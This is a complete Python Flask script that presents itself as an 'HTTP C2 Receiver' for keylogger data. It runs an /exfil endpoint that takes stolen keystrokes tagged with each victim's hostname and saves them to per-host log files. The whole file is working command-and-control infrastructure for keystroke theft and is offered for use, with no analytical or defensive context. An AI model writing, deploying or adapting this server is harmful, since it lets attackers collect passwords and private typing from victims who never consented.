#!/usr/bin/env python3
from flask import Flask, request, jsonify
import datetime
import os

app = Flask(__name__)
LOG_DIR = "keylogs"
os.makedirs(LOG_DIR, exist_ok=True)

@app.route('/exfil', methods=['POST'])
def exfil():
    try:
        data = request.get_json()
        if not data or 'keys' not in data:
            return jsonify({"status": "error"}), 400
        
        hostname = data.get('host', 'unknown')
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{LOG_DIR}/{hostname}_{timestamp}.log"
        
        with open(filename, "a") as f:
            f.write(f"[{timestamp}] {data['keys']}\n")
        
        print(f"[+] Received keys from {hostname} | Saved to {filename}")
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    print("HTTP C2 Receiver running on http://0.0.0.0:8080")
    app.run(host='0.0.0.0', port=8080, debug=False)